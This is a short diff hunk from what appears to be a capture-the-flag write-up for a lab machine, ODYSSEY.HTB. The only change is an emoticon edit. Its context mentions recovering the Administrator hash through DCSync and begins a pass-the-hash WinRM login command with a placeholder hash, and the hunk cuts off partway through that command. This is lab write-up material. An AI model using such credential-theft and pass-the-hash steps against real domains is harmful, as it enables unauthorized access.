@@ -801,7 +801,7 @@ print(subprocess.check_output([
 
 ### Reading the final flag
 
-Once the Administrator hash is recovered through DCSync, we can now read the last flag :)
+Once the Administrator hash is recovered through DCSync, we can now read the last flag :-)
 
 ```bash
 nxc winrm 127.0.0.1 -d ODYSSEY.HTB -u Administrator -H '<administrator_nt_hash>' \
